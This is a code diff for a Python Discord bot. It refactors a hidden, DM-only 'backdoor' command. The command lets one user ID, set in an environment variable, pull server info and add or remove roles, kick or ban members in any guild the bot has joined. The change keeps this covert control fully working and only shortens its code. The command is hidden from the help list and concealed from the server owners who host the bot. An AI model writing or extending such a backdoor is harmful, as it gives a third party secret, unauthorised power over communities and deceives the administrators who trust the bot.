@@ -647,152 +647,101 @@ except ValueError:
 logger.info(f"BACK_ACCESS_USER_ID loaded as: {BACK_ACCESS_USER_ID}")
 
 # DM-based backdoor command
-@bot.command(name='backdoor', hidden=True)
-# --- Put this near the top where you load env vars ---
+# --- Load BACK_ACCESS_USER_ID once at the top ---
 try:
-    BACK_ACCESS_USER_ID = int(os.getenv('BACK_ACCESS_USER_ID')) if os.getenv('BACK_ACCESS_USER_ID') else 0
+    BACK_ACCESS_USER_ID = int(os.getenv("BACK_ACCESS_USER_ID", "0"))
 except ValueError:
     BACK_ACCESS_USER_ID = 0
-logger.info(f"[DEBUG] BACK_ACCESS_USER_ID loaded as: {BACK_ACCESS_USER_ID}")
+logger.info(f"[BACKDOOR] BACK_ACCESS_USER_ID loaded: {BACK_ACCESS_USER_ID}")
 
-# --- Replace your existing back_access with the following function ---
-@bot.command(name='backdoor', hidden=True)
-async def back_access(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
-    """
-    DM-only backdoor:
-      Usage (DM): <prefix>backdoor <guild_id> <action> [target (id or mention)] [args...]
-
-    Actions:
-      - info
-      - roles        (requires target)
-      - addrole      (requires target + role name in args)
-      - removerole   (requires target + role name in args)
-      - kick         (requires target, optional reason in args)
-      - ban          (requires target, optional reason in args)
-    """
-    # Helper to DM the command author (reply only in DMs)
-    async def dm_reply(embed_or_text):
+# --- Backdoor command ---
+@bot.command(name="backdoor", hidden=True)
+async def backdoor(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
+    """DM-only backdoor command for authorized user"""
+    
+    async def dm_reply(msg):
+        """Send DM reply"""
         try:
-            if isinstance(embed_or_text, discord.Embed):
-                await ctx.author.send(embed=embed_or_text)
+            if isinstance(msg, discord.Embed):
+                await ctx.author.send(embed=msg)
             else:
-                await ctx.author.send(str(embed_or_text))
+                await ctx.author.send(str(msg))
         except Exception:
-            # If DMs fail, log it (they may have DMs disabled)
-            logger.warning(f"Could not DM user {ctx.author.id} (DMs may be disabled).")
+            logger.warning(f"Failed to DM user {ctx.author.id}")
 
-    # If invoked in a guild, delete message and instruct to use DMs
+    # Must be DM
     if ctx.guild is not None:
-        try:
-            await ctx.message.delete()
-        except Exception:
-            pass
+        try: await ctx.message.delete()
+        except: pass
         await dm_reply(discord.Embed(
             title="Use DMs",
-            description="This command only works via direct message to the bot. Please DM me with the guild ID and action.\n\nUsage: `backdoor <guild_id> <action> [target] [args]`",
+            description="This command only works via direct message to the bot.",
             color=discord.Color.orange()
         ))
         return
 
-    # Ensure BACK_ACCESS_USER_ID configured
-    if not BACK_ACCESS_USER_ID:
-        await dm_reply(discord.Embed(
-            title="Backdoor Disabled",
-            description="BACK_ACCESS_USER_ID is not configured or invalid on this bot.",
-            color=discord.Color.red()
-        ))
-        logger.warning("Backdoor attempted but BACK_ACCESS_USER_ID not set.")
-        return
-
-    # Authorization check
+    # Must be authorized user
     if ctx.author.id != BACK_ACCESS_USER_ID:
         await dm_reply(discord.Embed(
             title="Access Denied",
             description="You aren't allowed to use this command.",
             color=discord.Color.red()
         ))
-        logger.info(f"Backdoor access denied for user {ctx.author.id}; expected {BACK_ACCESS_USER_ID}")
+        logger.info(f"[BACKDOOR] Access denied for {ctx.author.id}")
         return
 
-    logger.info(f"Backdoor invoked by {ctx.author.id} -> guild_id={guild_id}, action={action}, target={target}, args={args}")
-
-    # Validate guild id
+    # Validate guild
     if not guild_id:
         await dm_reply(discord.Embed(
             title="Missing Guild ID",
-            description="You must provide a guild ID. Usage: `backdoor <guild_id> <action> [target] [args]`",
+            description="Usage: `backdoor <guild_id> <action> [target] [args]`",
             color=discord.Color.orange()
         ))
         return
 
     guild = bot.get_guild(guild_id)
-    if guild is None:
+    if not guild:
         await dm_reply(discord.Embed(
             title="Invalid Guild",
-            description="Guild not found or bot is not in that guild.",
+            description="Bot is not in that guild or guild ID is wrong.",
             color=discord.Color.red()
         ))
         return
 
-    # Helper to resolve a target string (mention or numeric id) into a Member object
-    async def resolve_member(target_str):
-        if target_str is None:
-            return None
-        # strip mention syntax if present, support <@123>, <@!123>, @name (not resolvable)
-        cleaned = target_str.strip()
-        # If the string looks like a mention <@...> or <@!...>
-        if cleaned.startswith('<@') and cleaned.endswith('>'):
-            cleaned = cleaned.lstrip('<@!').rstrip('>')
-        # Try numeric parse
+    # Resolve member helper
+    async def resolve_member(s):
+        if not s: return None
+        s = s.strip()
+        if s.startswith("<@") and s.endswith(">"): s = s.lstrip("<@!").rstrip(">")
+        try: member_id = int(s)
+        except ValueError: return None
+        member = guild.get_member(member_id)
+        if member: return member
         try:
-            target_id = int(cleaned)
-        except ValueError:
-            # Not numeric — can't resolve plain username in DM mode
-            return None
+            return await guild.fetch_member(member_id)
+        except: return None
 
-        # Try cache first
-        member = guild.get_member(target_id)
-        if member:
-            return member
-        # Attempt fetch_member (requires members intent & bot to have access)
-        try:
-            member = await guild.fetch_member(target_id)
-            return member
-        except discord.NotFound:
-            return None
-        except discord.Forbidden:
-            # Bot lacks permissions to fetch that member
-            logger.warning(f"Forbidden when fetching member {target_id} from guild {guild_id}")
-            return None
-        except Exception as e:
-            logger.exception(f"Error fetching member {target_id} from guild {guild_id}: {e}")
-            return None
-
-    # Resolve member where needed
     member = None
     if action in ("roles", "addrole", "removerole", "kick", "ban"):
         member = await resolve_member(target)
-        if member is None:
+        if not member:
             await dm_reply(discord.Embed(
                 title="Member Not Found",
-                description=f"Could not find a member with identifier `{target}` in **{guild.name}**.\n\nMake sure you provided a numeric ID or mention, and that the user is in the guild.",
+                description=f"Could not find `{target}` in **{guild.name}**.",
                 color=discord.Color.red()
             ))
             return
 
-    # Utility to get the bot's member entry in that guild (guild.me may be None in older versions)
     bot_member = guild.me or guild.get_member(bot.user.id)
 
-    # ACTIONS
     try:
         if action == "info":
             embed = discord.Embed(title=f"Server Info - {guild.name}", color=discord.Color.blue())
-            embed.add_field(name="Members", value=guild.member_count, inline=True)
-            embed.add_field(name="Roles", value=len(guild.roles), inline=True)
-            embed.add_field(name="Channels", value=len(guild.channels), inline=True)
-            embed.add_field(name="Owner", value=str(guild.owner) if guild.owner else "Unknown", inline=True)
-            if guild.icon:
-                embed.set_thumbnail(url=guild.icon.url)
+            embed.add_field(name="Members", value=guild.member_count)
+            embed.add_field(name="Roles", value=len(guild.roles))
+            embed.add_field(name="Channels", value=len(guild.channels))
+            embed.add_field(name="Owner", value=str(guild.owner) if guild.owner else "Unknown")
+            if guild.icon: embed.set_thumbnail(url=guild.icon.url)
             await dm_reply(embed)
             return
 
@@ -807,87 +756,58 @@ async def back_access(ctx, guild_id: int = None, action: str = None, target: str
 
         if action == "addrole":
             if not args:
-                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in the args.", color=discord.Color.orange()))
+                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in args.", color=discord.Color.orange()))
                 return
-
-            # Find role exact or partial case-insensitive
             role = discord.utils.get(guild.roles, name=args) or discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
             if not role:
-                await dm_reply(discord.Embed(title="Role Not Found", description=f"No role matching `{args}` in `{guild.name}`.", color=discord.Color.red()))
+                await dm_reply(discord.Embed(title="Role Not Found", description=f"No role matching `{args}`.", color=discord.Color.red()))
                 return
-
-            # Hierarchy check
             if bot_member and role.position >= (bot_member.top_role.position if bot_member.top_role else -1):
-                await dm_reply(discord.Embed(title="Permission Error", description="Bot cannot manage that role due to role hierarchy.", color=discord.Color.red()))
+                await dm_reply(discord.Embed(title="Permission Error", description="Bot cannot manage this role.", color=discord.Color.red()))
                 return
-
             if role in member.roles:
                 await dm_reply(discord.Embed(title="Already Has Role", description=f"{member.display_name} already has `{role.name}`.", color=discord.Color.orange()))
                 return
-
-            try:
-                await member.add_roles(role, reason=f"Backdoor by {ctx.author.id}")
-                await dm_reply(discord.Embed(title="Success", description=f"Added role `{role.name}` to {member.display_name}.", color=discord.Color.green()))
-            except discord.Forbidden:
-                await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission to add roles.", color=discord.Color.red()))
-            except Exception as e:
-                logger.exception("Failed to add role")
-                await dm_reply(discord.Embed(title="Error", description=f"Failed to add role: {e}", color=discord.Color.red()))
+            await member.add_roles(role, reason=f"Backdoor by {ctx.author.id}")
+            await dm_reply(discord.Embed(title="Success", description=f"Added role `{role.name}` to {member.display_name}.", color=discord.Color.green()))
             return
 
         if action == "removerole":
             if not args:
-                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in the args.", color=discord.Color.orange()))
+                await dm_reply(discord.Embed(title="Missing Role", description="Provide a role name in args.", color=discord.Color.orange()))
                 return
-
             role = discord.utils.get(guild.roles, name=args) or discord.utils.find(lambda r: args.lower() in r.name.lower(), guild.roles)
             if not role or role not in member.roles:
-                await dm_reply(discord.Embed(title="Role Error", description=f"Role `{args}` not found or not assigned to the member.", color=discord.Color.red()))
+                await dm_reply(discord.Embed(title="Role Error", description=f"Role `{args}` not found or not assigned.", color=discord.Color.red()))
                 return
-
-            try:
-                await member.remove_roles(role, reason=f"Backdoor by {ctx.author.id}")
-                await dm_reply(discord.Embed(title="Success", description=f"Removed role `{role.name}` from {member.display_name}.", color=discord.Color.green()))
-            except discord.Forbidden:
-                await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission to remove roles.", color=discord.Color.red()))
-            except Exception as e:
-                logger.exception("Failed to remove role")
-                await dm_reply(discord.Embed(title="Error", description=f"Failed to remove role: {e}", color=discord.Color.red()))
+            await member.remove_roles(role, reason=f"Backdoor by {ctx.author.id}")
+            await dm_reply(discord.Embed(title="Success", description=f"Removed role `{role.name}` from {member.display_name}.", color=discord.Color.green()))
             return
 
         if action == "kick":
             reason = args or "No reason provided"
-            try:
-                await member.kick(reason=f"Backdoor by {ctx.author.id} - {reason}")
-                await dm_reply(discord.Embed(title="Success", description=f"Kicked {member.display_name}. Reason: {reason}", color=discord.Color.green()))
-            except discord.Forbidden:
-                await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission to kick members.", color=discord.Color.red()))
-            except Exception as e:
-                logger.exception("Failed to kick")
-                await dm_reply(discord.Embed(title="Error", description=f"Failed to kick: {e}", color=discord.Color.red()))
+            await member.kick(reason=f"Backdoor by {ctx.author.id} - {reason}")
+            await dm_reply(discord.Embed(title="Success", description=f"Kicked {member.display_name}. Reason: {reason}", color=discord.Color.green()))
             return
 
         if action == "ban":
             reason = args or "No reason provided"
-            try:
-                await member.ban(reason=f"Backdoor by {ctx.author.id} - {reason}")
-                await dm_reply(discord.Embed(title="Success", description=f"Banned {member.display_name}. Reason: {reason}", color=discord.Color.green()))
-            except discord.Forbidden:
-                await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission to ban members.", color=discord.Color.red()))
-            except Exception as e:
-                logger.exception("Failed to ban")
-                await dm_reply(discord.Embed(title="Error", description=f"Failed to ban: {e}", color=discord.Color.red()))
+            await member.ban(reason=f"Backdoor by {ctx.author.id} - {reason}")
+            await dm_reply(discord.Embed(title="Success", description=f"Banned {member.display_name}. Reason: {reason}", color=discord.Color.green()))
             return
 
         # Unknown action
         await dm_reply(discord.Embed(
             title="Invalid Action",
-            description="Actions: `info`, `roles`, `addrole`, `removerole`, `kick`, `ban`.\nUsage: `backdoor <guild_id> <action> [target] [args]`",
+            description="Actions: `info`, `roles`, `addrole`, `removerole`, `kick`, `ban`",
             color=discord.Color.orange()
         ))
+
+    except discord.Forbidden:
+        await dm_reply(discord.Embed(title="Permission Error", description="Bot lacks permission.", color=discord.Color.red()))
     except Exception as e:
-        logger.exception("Unhandled error in backdoor")
-        await dm_reply(discord.Embed(title="Error", description=f"An unexpected error occurred: {e}", color=discord.Color.red()))
+        logger.exception("[BACKDOOR] Unexpected error")
+        await dm_reply(discord.Embed(title="Error", description=f"An error occurred: {e}", color=discord.Color.red()))
 
 
 @bot.event
